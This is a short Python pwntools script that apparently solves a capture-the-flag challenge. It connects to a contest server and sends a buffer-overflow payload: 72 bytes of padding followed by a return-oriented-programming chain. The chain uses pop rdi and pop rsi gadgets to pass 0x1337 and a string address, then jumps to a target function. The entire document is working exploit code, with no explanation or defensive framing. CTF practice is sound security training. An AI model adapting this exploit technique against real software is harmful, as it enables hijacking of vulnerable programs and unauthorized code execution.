from pwn import *

p = process('./really_obnoxious_problem')
p = remote('challs.actf.co', 31225)

pop_rdi = 0x4013f3
pop_rsi_r15 = 0x04013f1
ret = 0x40101a
bobby_adr = 0x402004
target = 0x401256

payload = b'A'*72
payload += pop_rdi.to_bytes(8, 'little')
payload += (0x1337).to_bytes(8, 'little')
payload += pop_rsi_r15.to_bytes(8, 'little')
payload += bobby_adr.to_bytes(8, 'little')
payload += bobby_adr.to_bytes(8, 'little')
payload += target.to_bytes(8, 'little')

p.recv()
p.sendline(b'bobby')
p.recv()
p.sendline(payload)
print(p.recv())
print(p.recv())
